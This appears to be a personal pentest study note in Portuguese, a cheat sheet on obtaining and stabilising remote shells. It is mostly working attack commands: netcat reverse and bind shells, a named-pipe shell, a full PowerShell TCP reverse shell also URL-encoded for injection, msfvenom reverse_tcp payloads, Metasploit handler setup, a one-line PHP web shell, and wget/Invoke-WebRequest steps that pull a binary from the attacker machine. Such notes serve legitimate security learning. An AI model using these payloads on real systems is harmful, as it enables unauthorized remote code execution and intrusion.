---
tags:
  - WEB
  - Pentest
---
- **Reverse Shell** - Ocorrem quando o alvo é forçado a executar um código que se conecta novamente ao seu computador. Em seu próprio computador, você usaria uma das ferramentas mencionadas na tarefa anterior para configurar um ouvinte que seria usado para receber a conexão. Os shells reversos são uma boa maneira de contornar as regras de firewall que podem impedi-lo de se conectar a portas arbitrárias no alvo; 
```shell
#Máquina atacante:
	sudo nc -lvnp 443
#Alvo
	nc <LOCAL-IP> <PORT> -e /bin/bash
```
- **Bind shells** - São quando o código executado no alvo é usado para iniciar um listener anexado a um shell diretamente no alvo. Isso seria então aberto para a Internet, o que significa que você pode se conectar à porta que o código abriu e obter a execução remota do código dessa forma. 
```shell
#Alvo:
	nc -lvnp <port> -e "cmd.exe"
#Atacante:
	nc MACHINE_IP <port>
```

# Técnica 1: Python

A primeira técnica é aplicável somente a **computadores Linux**, pois eles quase sempre têm o Python instalado por padrão. Esse é um processo de três etapas:

1. Usar `python -c 'import pty;pty.spawn("/bin/bash")'`, que usa o Python para gerar um shell bash com recursos melhores;
 2. Exportar `TERM=xterm` - isso nos dará acesso a comandos `term`, como `clear`.
3. Colocar o shell em segundo plano usando `Ctrl + Z`. De volta ao nosso próprio terminal, usamos `stty raw -echo; fg`. 
	Isso faz duas coisas: primeiro, **desativa o eco do nosso próprio terminal** (o que nos dá acesso aos autocompletos de tabulação, às teclas de seta e ao Ctrl + C para eliminar processos). Em seguida, ele **coloca o shell em primeiro plano**, concluindo assim o processo.

![[Pasted image 20231216192542.png]]

#  Técnica 2: Socat
Uma maneira típica de conseguir isso seria usar um servidor da Web no computador atacante dentro do diretório que contém o binário socat:
```shell
sudo python3 -m http.server 80
``` 
E, em seguida, no computador de destino, usar o shell netcat para baixar o arquivo. No Linux, isso seria feito com curl ou wget:
```shell
wget <LOCAL-IP>/socat -O /tmp/socat
```

Para completar: em um ambiente Windows CLI, o mesmo pode ser feito com o Powershell, usando Invoke-WebRequest ou uma classe de sistema webrequest, dependendo da versão do Powershell instalada:
```powershell
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

# Payloads Comuns
```shell
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# Msfvenom
```shell
#windows
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
#linux
msfvenom -p linux/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.5,LPORT=443
```

#  Metasploit multi/handler 
1. Abra o Metasploit com o `msfconsole`
Digite use `multi/handler` e pressione Enter

    set PAYLOAD <payload>
    set LHOST <listen-address>
    set LPORT <listen-port>

Agora devemos estar prontos para iniciar o ouvinte!

Vamos fazer isso usando o comando `exploit -j`. Isso diz ao Metasploit para iniciar o módulo, executando-o como um trabalho em segundo plano.

# Web Shell
```shell
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

![[Pasted image 20231217235530.png]]

Quando o alvo é o Windows, geralmente é mais fácil obter o RCE usando um shell da Web ou usando o msfvenom para gerar um shell reverso/vinculado no idioma do servidor. Com o primeiro método, a obtenção de RCE geralmente é feita com um shell reverso Powershell codificado por URL. Isso seria copiado no URL como o argumento cmd:

```shell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

